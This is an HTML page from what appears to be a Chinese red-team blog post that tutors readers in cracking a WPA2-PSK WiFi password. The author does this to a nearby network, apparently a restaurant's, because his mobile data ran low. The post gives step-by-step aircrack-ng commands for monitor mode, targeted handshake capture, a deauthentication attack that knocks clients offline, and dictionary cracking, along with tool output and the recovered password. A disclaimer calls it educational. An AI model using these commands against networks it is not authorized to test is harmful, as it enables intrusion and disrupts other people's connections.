@@ -1,0 +1,422 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🐳毅种循环</title>
+<meta name="description" content="</br>西郊有密林，助君出重围。</br>
+</br># WhoAmI</br>
+</br># 毅种循环</br>" />
+<link rel="shortcut icon" href="https://redteamblog.icu/favicon.ico?v=1668483625774">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://redteamblog.icu/styles/main.css">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-226932280-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-226932280-1');
+</script>
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://redteamblog.icu">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://redteamblog.icu/images/avatar.png?v=1668483625774" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">🐳毅种循环</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E6%8F%90%E5%89%8D%E5%87%86%E5%A4%87">提前准备</a></li>
+<li><a href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86">技术原理</a>
+<ul>
+<li><a href="#wifi%E8%AE%A4%E8%AF%81">WiFi认证</a></li>
+<li><a href="#wpa-psk%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B">WPA-PSK的认证过程</a></li>
+<li><a href="#wpa-psk%E8%AE%A4%E8%AF%81%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%AE%A4%E8%AF%81%E7%9A%84%E8%BF%87%E7%A8%8B">WPA-PSK认证四次握手认证的过程</a></li>
+<li><a href="#wpa-psk%E7%A0%B4%E8%A7%A3%E5%8E%9F%E7%90%86">WPA-PSK破解原理</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BC%80%E5%81%B7">开偷</a>
+<ul>
+<li><a href="#%E5%90%AF%E5%8A%A8%E7%BD%91%E5%8D%A1">启动网卡</a></li>
+<li><a href="#%E6%BF%80%E6%B4%BB%E7%BD%91%E5%8D%A1%E4%B8%BA%E7%9B%91%E5%90%ACmonitor%E6%A8%A1%E5%BC%8F"><strong>激活网卡为监听（monitor）模式</strong></a></li>
+<li><a href="#%E6%8E%A2%E6%B5%8B%E5%91%A8%E5%9B%B4%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C"><strong>探测周围无线网络</strong></a></li>
+<li><a href="#%E9%80%89%E6%8B%A9%E8%A6%81%E7%A0%B4%E8%A7%A3%E7%9A%84wifi%E6%9C%89%E9%92%88%E5%AF%B9%E6%80%A7%E7%9A%84%E8%BF%9B%E8%A1%8C%E6%8A%93%E6%8F%A1%E6%89%8B%E5%8C%85"><strong>选择要破解的WiFi，有针对性的进行抓握手包</strong></a></li>
+<li><a href="#%E7%9B%91%E5%90%AC%E6%8F%A1%E6%89%8B%E5%8C%85">监听握手包</a></li>
+<li><a href="#%E6%89%A7%E8%A1%8C%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB%E8%8E%B7%E5%BE%97%E6%8F%A1%E6%89%8B%E5%8C%85">执行断网攻击获得握手包</a></li>
+<li><a href="#%E5%AD%97%E5%85%B8%E7%A0%B4%E8%A7%A3">字典破解</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9C%80%E5%90%8E">最后</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          😀首页
+        </a>
+      
+    
+      
+        <a href="/posts" class="menu" style="animation-delay: 0.2s">
+          🦉文章列表
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.4s">
+          🤿归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.6000000000000001s">
+          🏄‍♀️标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.8s">
+          👹关于
+        </a>
+      
+    
+      
+        <a href="links/" class="menu" style="animation-delay: 1s">
+          友情链接
+        </a>
+      
+    
+      
+        <a href="/tag/wQ9CEdhmu" class="menu" style="animation-delay: 1.2000000000000002s">
+          🌿随笔
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700"></div>
+    <a class="rss" href="https://redteamblog.icu/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">我偷他的网</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2022-06-07 / 9 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://api.ixiaowai.cn/api/api.php?=12" alt="">
+        
+        <div class="post-content yue">
+          <blockquote>
+<p>本文章仅作为技术学习交流，请不要随意拿邻居开刀。</p>
+</blockquote>
+<h2 id="提前准备">提前准备</h2>
+<p>你需要如下材料</p>
+<ul>
+<li>一个支持监听的无线网卡设备</li>
+<li>一个强大的WiFi字典</li>
+<li>一个有WiFi的地方</li>
+</ul>
+<p>最近流量不够用了，想着偷个网试试，看了一下周边的WiFi布局。。</p>
+<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/assets/image-20220607124605-4xhuvdr.png" alt="image.png" loading="lazy"></figure>
+<p>还是有一些WIFI设备的，然后开始尝试能不能搞一个来。</p>
+<h2 id="技术原理">技术原理</h2>
+<h3 id="wifi认证">WiFi认证</h3>
+<p>大家都知道WiFi大略是有四种支持格式的，</p>
+<p>1、不启用安全</p>
+<p>2、WEP</p>
+<p>3、WPA/WPA2-PSK</p>
+<p>4、WPA/WPA2 802.1X （radius认证）</p>
+<p>一般我们设置的都是第三种。</p>
+<h3 id="wpa-psk的认证过程">WPA-PSK的认证过程</h3>
+<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/assets/image-20220607153530-vqv897d.png" alt="image.png" loading="lazy"></figure>
+<p>1、无线AP定期发送beacon数据包，使无线终端更新自己的无线网络列表。</p>
+<p>2、无线终端在每个信道（1-13）广播ProbeRequest（非隐藏类型的WiFi含ESSID，隐藏类型的WiFi不含ESSID）</p>
+<p>3、每个信道的AP回应，ProbeResponse，包含ESSID，及RSN信息</p>
+<p>4、无线终端给目标AP发送AUTH包。AUTH认证类型有两种，0为开放式、1为共享式（WPA/WPA2必须是开放式）</p>
+<p>5、AP回应网卡AUTH包</p>
+<p>6、无线终端给AP发送关联请求包associationrequest数据包 7、AP给无线终端发送关联响应包associationresponse数据包</p>
+<p>8、EAPOL四次握手进行认证（握手包是破解的关键）</p>
+<p>9、完成认证可以上网。</p>
+<h3 id="wpa-psk认证四次握手认证的过程">WPA-PSK认证四次握手认证的过程</h3>
+<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/assets/image-20220607153608-ek1n9fo.png" alt="image.png" loading="lazy"></figure>
+<h3 id="wpa-psk破解原理">WPA-PSK破解原理</h3>
+<p>用我们字典中的PSK+ssid先生成PMK（此步最耗时，是目前破解的瓶颈所在），然后结合握手包中的客户端MAC，AP的BSSID，A-NONCE，S-NONCE计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。</p>
+<p>如图所示：</p>
+<figure data-type="image" tabindex="4"><img src="https://redteamblog.icu/post-images/assets/image-20220607153640-xgcv2dc.png" alt="image.png" loading="lazy"></figure>
+<p>所以还是爆破握手包的方式来获得密码，由于是通过暴力破解方式破解Wifi密码，所以你需要下载一些强大的字典，字典可以直接在Github上搜索，或者直接google。</p>
+<h2 id="开偷">开偷</h2>
+<h3 id="启动网卡">启动网卡</h3>
+<p>我这里使用的是Kali，插入无线网卡的时候请选择和虚拟机相连。</p>
+<pre><code class="language-net">ifconfig-a /此命令查看所有网络设备器
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://redteamblog.icu/post-images/assets/image-20220607153942-5kcv6rb.png" alt="image.png" loading="lazy"></figure>
+<p>如果你的连接没有出错，此时应该会有一张名为<code>wlan0</code>的网卡设备。</p>
+<p>接着使用命令,激活这张网卡，如果不回显则开启成功。</p>
+<pre><code class="language-net">ifconfig wlan0 up
+</code></pre>
+<h3 id="激活网卡为监听monitor模式"><strong>激活网卡为监听（monitor）模式</strong></h3>
+<pre><code class="language-net">airmon-ng start wlan0
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://redteamblog.icu/post-images/assets/image-20220607154221-qs06sua.png" alt="image.png" loading="lazy"></figure>
+<p>同时，你的无线网卡应该会有指示灯之类的亮起（看型号，是否启用成功还是看上图结果）</p>
+<p>得到监控模式下的设备名是wlan0mon，请记住这个名字，后续有用。</p>
+<h3 id="探测周围无线网络"><strong>探测周围无线网络</strong></h3>
+<p>我现在连接的是我自己的手机热点，插入无线网卡后开始嗅探周围的WIFI设备。</p>
+<pre><code class="language-net">airodump-ng wlan0mon
+</code></pre>
+<p>查看周边路由AP的信息。</p>
+<p>个人经验一般信号强度大于-70的可以进行破解，大于-60就最好了，小于-70的不稳定，信号比较弱。（信号强度的绝对值越小表示信号越强）</p>
+<figure data-type="image" tabindex="7"><img src="https://redteamblog.icu/post-images/assets/image-20220607152550-n0q94jv.png" alt="image.png" loading="lazy"></figure>
+<p>这里我们将会对 游走老火锅 这个WiFi进行攻击，所以我们需要记录下对应的 <code>BSSID</code> 以及 <code>CH</code> ，这两个值分别是WiFi唯一标识和信道。 建议选择 <code>PWR</code> 较小的WiFi，因为这意味着信号较好。</p>
+<p>如果要弄懂这些参数都是什么，我贴两张网上的图：<br>
+​<img src="https://redteamblog.icu/post-images/assets/image-20220607154620-g019a5y.png" alt="image.png" loading="lazy"></p>
+<figure data-type="image" tabindex="8"><img src="https://redteamblog.icu/post-images/assets/image-20220607154641-pjbrj0v.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://redteamblog.icu/post-images/assets/image-20220607154645-hai1ozm.png" alt="image.png" loading="lazy"></figure>
+<h3 id="选择要破解的wifi有针对性的进行抓握手包"><strong>选择要破解的WiFi，有针对性的进行抓握手包</strong></h3>
+<pre><code class="language-net">airodump-ng wlan0mon -c 7 --bssid 14:75:90:9E:29:8E
+</code></pre>
+<p>其中的 <code>-c</code> 参数代表了信道号， <code>--bssid</code> 代表此WiFi的唯一标识。</p>
+<p>执行后等待一会，输出结果如下:</p>
+<pre><code>fundamental     CH 7 ][ Elapsed: 6 s ][ 2021-04-07 23:41
+
+      BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+      14:75:90:9E:29:8E  -37   1       89     4294  299  11  270   WPA2 CCMP   PSK  203
+
+      BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+      14:75:90:9E:29:8E  48:7D:2E:B3:04:DF  -29    0 - 1e     0        7
+      14:75:90:9E:29:8E  E0:DC:FF:DC:5A:89  -40    0 - 0e   817     4259
+      14:75:90:9E:29:8E  80:ED:2C:10:0D:8A  -63    0 -24      0        2
+      14:75:90:9E:29:8E  FA:83:C4:C0:8F:DF  -60    0e-24     88       88
+</code></pre>
+<p>从这个输出结果我们可以分析到的数据：</p>
+<ul>
+<li>当前连接此WiFi的设备有4台，以及每台设备的唯一标识，发包数等。 下面的四行也就代表了四台设备，我们需要记录 <code>Lost</code> 有变化的设备标识，这里我们选择标识为 <code>E0:DC:FF:DC:5A:89</code> 的设备。</li>
+</ul>
+<p>好的，目前我们掌握了几条有用的信息，如下:</p>
+<p>WiFi唯一标识14:75:90:9E:29:8E</p>
+<p>连接WiFi的设备之一的标识E0:DC:FF:DC:5A:89</p>
+<p>WiFi的信道11</p>
+<h3 id="监听握手包">监听握手包</h3>
+<p>下面我们需要根据以上信息进行抓包，尝试拿到包含密钥的握手包。</p>
+<pre><code>airodump-ng wlan0mon --bssid 14:75:90:9E:29:8E -c 11 -w 203
+</code></pre>
+<p>参数说明：-w 保存数据包的文件名 –c 信道 –bssid ap的mac地址 (注意test.cap会被重命名)，也可以用其他工具抓包比如：wireshark、tcpdump，抓到握手包会有提示。</p>
+<pre><code class="language-net">airodump-ng --ivs --bssid E6:9A:DC:79:7:EC -w longas -c 1 wlan0mon**
+</code></pre>
+<p>PS：我建议使用这条作为监听，–ivs 这里的设置是通过过滤，不再将所有的无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小。如果按照第一个语句去监听，不过滤请求的话会有很多额外的请求，后续的图我将以这条语句作为演示。</p>
+<p>监听的时候如果有设备登录成功就会抓到握手包，那么此时客户端不一定有会有登录的包发送给服务端，怎么样去抓到这个带有认证请求的包呢，很简单，强行使客户端断开即可。</p>
+<h3 id="执行断网攻击获得握手包">执行断网攻击获得握手包</h3>
+<p>下面我们需要利用 <code>Aireplay-ng</code> 进行断网攻击，当用户重连WiFi时 <code>Airodump-ng</code> 应该就能拿到密钥的数据包了。</p>
+<pre><code>aireplay-ng wlan0mon -0 10 -a 14:75:90:9E:29:8E -c E0:DC:FF:DC:5A:89 
+</code></pre>
+<p>这里的 <code>-0</code> 代表攻击次数，后面的10也就是攻击次数、 <code>-a</code> 代表要攻击的WiFi、 <code>-c</code> 代表要攻击的已连接WiFi的设备。</p>
+<p>此命令的输出结果如下:</p>
+<pre><code>fundamental     23:55:26  Waiting for beacon frame (BSSID: 14:75:90:9E:29:8E) on channel 11
+     23:55:28  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [27| 1 ACKs]
+     23:55:29  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 3| 1 ACKs]
+     23:55:30  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 2| 6 ACKs]
+     23:55:32  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 8| 7 ACKs]
+     23:55:34  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 7| 7 ACKs]
+     23:55:36  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 7|14 ACKs]
+     23:55:39  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [34| 3 ACKs]
+     23:55:41  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [22| 6 ACKs]
+     23:55:43  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [ 5| 5 ACKs]
+     23:55:45  Sending 64 directed DeAuth (code 7). STMAC: [E0:DC:FF:DC:5A:89] [10| 6 ACKs]
+</code></pre>
+<p>如果这种方式多次失败，可以尝试去掉 <code>-c</code> 参数，进行范围打击，对每个设备都进行攻击，这样拿到加密包的机率也会有提升。</p>
+<p>当 <code>airodump-ng</code> 那边提示拿到 <code>WPA handshake</code> 即代表拿到加密握手包，也就不需要断网攻击了。</p>
+<figure data-type="image" tabindex="10"><img src="https://redteamblog.icu/post-images/assets/image-20220607155422-4ttz92y.png" alt="image.png" loading="lazy"></figure>
+<p>我实践中使用是把整个客户端打掉线让他们重连的。</p>
+<figure data-type="image" tabindex="11"><img src="https://redteamblog.icu/post-images/assets/image-20220607155541-rr8obs3.png" alt="image.png" loading="lazy"></figure>
+<p>当这边的shell提示WPA handshake就说明获取到握手包了，可以停止了。</p>
+<pre><code class="language-net">CH 11 ][ Elapsed: 6 mins ][ 2021-04-08 00:05 ][ WPA handshake: 14:75:90:9E:29:8E
+</code></pre>
+<h3 id="字典破解">字典破解</h3>
+<p>下面我们通过准备的字典以及拿到的握手包进行暴力破解。</p>
+<p>执行如下命令进行破解</p>
+<pre><code>aircrack-ng -w common.txt 203.ivs
+</code></pre>
+<p><code>-w</code> 是我们的字典， <code>203-01.cap</code> 是我们拿到的密钥握手包。</p>
+<p>我这个运气不错，密码相对简单。</p>
+<figure data-type="image" tabindex="12"><img src="https://redteamblog.icu/post-images/assets/image-20220607155920-bf52mfb.png" alt="image.png" loading="lazy"></figure>
+<p>KEY FOUND! [ 99998888 ]即是密码。</p>
+<figure data-type="image" tabindex="13"><img src="https://redteamblog.icu/post-images/assets/image-20220607161028-54f0fae.png" alt="image.png" loading="lazy"></figure>
+<h2 id="最后">最后</h2>
+<p>请善待你的邻居，不要随意拿邻居开刀。</p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://redteamblog.icu/tag/wCy7cqF7v/">
+            <span class="flex-auto">近源渗透</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://redteamblog.icu/post/jie-jue-xin-ban-ben-wei-xin-xiao-cheng-xu-wu-fa-zhua-bao/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  解决新版本微信小程序无法抓包
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://redteamblog.icu/post/靶机日志-2019-1388提权/">
+                <h3 class="post-title">
+                  靶机日志-2019-1388提权篇
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://redteamblog.icu/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
